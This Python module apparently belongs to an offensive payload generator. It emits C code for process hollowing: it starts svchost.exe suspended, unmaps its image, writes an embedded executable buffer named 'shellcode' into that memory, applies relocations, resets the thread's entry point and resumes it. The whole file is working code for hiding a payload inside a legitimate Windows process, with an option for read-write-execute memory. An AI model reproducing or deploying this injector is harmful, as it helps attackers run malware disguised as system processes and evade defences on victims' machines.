from string import Template

class processhollow:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target']

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <tlhelp32.h>", 
                "#include <string.h>",
                "#include <winternl.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def apicalls(self) -> list[str]:
        return ['NtUnmapViewOfSection', 'VirtualAllocEx', 'CreateProcessA', 'GetThreadContext', 'SetThreadContext', 'ReadProcessMemory', 'WriteProcessMemory', 'ResumeThread']

    def codeblocks(self) -> str:
        return """
typedef struct RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} RELOCATION_BLOCK, * PRELOCATION_BLOCK;

typedef struct RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} RELOCATION_ENTRY, * PRELOCATION_ENTRY;

"""

    def template(self) -> str:
        return Template("""

    {transformers}

    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

	{CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	// Get All The Register Values
	printf("[+] Getting Current Context.\\n");
	CONTEXT threadContext;
    ZeroMemory(&threadContext, sizeof(CONTEXT));
	threadContext.ContextFlags = CONTEXT_FULL;
	if (!{GetThreadContext}(pi.hThread, &threadContext)) {{
		printf("[-] Error getting context\\n");
		return 0;
	}}


	// Get The Base Address Of The Suspended Process
	PVOID baseAddress;
    
    {ReadProcessMemory}(pi.hProcess, (PVOID)(threadContext.Rdx + (sizeof(SIZE_T) * 2)), &baseAddress, sizeof(PVOID), NULL);

    // Getting The Address Of NtUnmapViewOfSection And Unmapping All Sections
	printf("[+] Unmapping the Memory Section of Target Process.\\n");
	if ({NtUnmapViewOfSection}(pi.hProcess, baseAddress)) {{
		printf("[-] Error to unmap the Section\\n");
		return 0;
	}}


	// Getting The DOS Header And The NT Header 
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)shellcode;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)shellcode + dosHeader->e_lfanew);

	// Allocating Memory in Suspended Process
	PVOID allocatedMemory = {VirtualAllocEx}(pi.hProcess, baseAddress, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, $memoryPermission);

	// Calculate The Offset Of the 64-bits Process Base Address From The File's Base Address
	DWORD64 baseOffset = (DWORD64)baseAddress - ntHeaders->OptionalHeader.ImageBase;
	printf("[+] Original Process Base: 0x%p\\n[+] Inject File Base: 0x%p\\n\\n", ntHeaders->OptionalHeader.ImageBase, baseAddress);

	// Change The File's Base Address To The Base Address Of The Suspended Process
	ntHeaders->OptionalHeader.ImageBase = (DWORD64)baseAddress;

	// Write The File's Headers To The Allocated Memory In The Suspended Process
	if (!{WriteProcessMemory}(pi.hProcess, baseAddress, shellcode, ntHeaders->OptionalHeader.SizeOfHeaders, 0)) {{
		printf("Failed to write Headers\\n");
		return 0;
	}}

	// Write All The Sections From The Mapped File To The Suspended Process
	PIMAGE_SECTION_HEADER sectionHeader;

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{{
		// Get The Header Of The Current Section
		sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)shellcode + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("0x%p -- Writing Section: %s\\n", (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress, sectionHeader->Name);

		// Write The Section From The File Into The Allocated Memory
		if (!{WriteProcessMemory}(pi.hProcess, (PVOID)((LPBYTE)allocatedMemory + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)shellcode + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL)) {{
			printf("Error Writing Section: %s. At: 0x%p\\n", sectionHeader->Name, (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress);
		}}
	}}

	// Check If There Is an Offset Between the Base Addresses
	if (baseOffset) {{

		printf("\\nRelocating The Relocation Table...\\n");

		// Loop Over Every Section
		for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
		{{
			// Get The Header Of The Current Section
			sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)shellcode + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

			// Compare The Section Name To The ".reloc" Section
			char relocSectionName[] = ".reloc";
			if (memcmp(sectionHeader->Name, relocSectionName, strlen(relocSectionName))) {{
				// If The Section Is Not The ".reloc" Section Continue To The Next Section
				continue;
			}}

			// Get The Address Of The Section Data
			DWORD relocAddress = sectionHeader->PointerToRawData;
			IMAGE_DATA_DIRECTORY relocData = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			DWORD offset = 0;

			// Iterate Over The Relocation Table
			while (offset < relocData.Size) {{

				// Get The Header Of The Relocation Block
				PRELOCATION_BLOCK blockHeader = (PRELOCATION_BLOCK)&shellcode[relocAddress + offset];
				printf("\\nRelocation Block 0x%p. Size: 0x%p\\n", blockHeader->PageAddress, blockHeader->BlockSize);

				offset += sizeof(RELOCATION_BLOCK);

				// Calculate The Entries In The Current Table
				DWORD entryCount = (blockHeader->BlockSize - sizeof(RELOCATION_BLOCK)) / sizeof(RELOCATION_ENTRY);
				printf("%d Entries Must Be Relocated In The Current Block.\\n", entryCount);

				PRELOCATION_ENTRY blockEntries = (PRELOCATION_ENTRY)&shellcode[relocAddress + offset];

				for (int x = 0; x < entryCount; x++)
				{{
					offset += sizeof(RELOCATION_ENTRY);

					// If The Type Of The Entry Is 0 We Don't Need To Do Anything
					if (blockEntries[x].Type == 0) {{
						printf("The Type Of Base Relocation Is 0. Skipping.\\n");
						continue;
					}}

					// Resolve The Address Of The Reloc
					DWORD fieldAddress = blockHeader->PageAddress + blockEntries[x].Offset;

					// Read The Value At That Address
					DWORD64 entryAddress = 0;
					{ReadProcessMemory}(pi.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
					printf("0x%p --> 0x%p | At:0x%p\\n", entryAddress, entryAddress + baseOffset, (PVOID)((DWORD64)baseAddress + fieldAddress));

					// Add The Correct Offset To That Address And Write It
					entryAddress += baseOffset;
					if (!{WriteProcessMemory}(pi.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {{
						printf("Error Writing Entry.\\n");
					}}
				}}
			}}
		}}
	}}

	// Write The New Image Base Address
	{WriteProcessMemory}(pi.hProcess, (PVOID)(threadContext.Rdx + (sizeof(SIZE_T) * 2)), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entry Point
	DWORD64 entryPoint = (DWORD64)((LPBYTE)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	threadContext.Rcx = entryPoint;

	printf("\\n[+] Setting the Thread Context.\\n");
	if (!{SetThreadContext}(pi.hThread, &threadContext)) {{
		printf("Error setting context\\n");
		return 0;
	}}

	printf("[+] Resuming Thread.\\n");
	if (!{ResumeThread}(pi.hThread)) {{
		printf("[-]Error resuming thread\\n");
		return 0;
	}}

	printf("[+] Process Hollowing Technique Done");

""").substitute(target=self.target, memoryPermission=self.memoryPermission)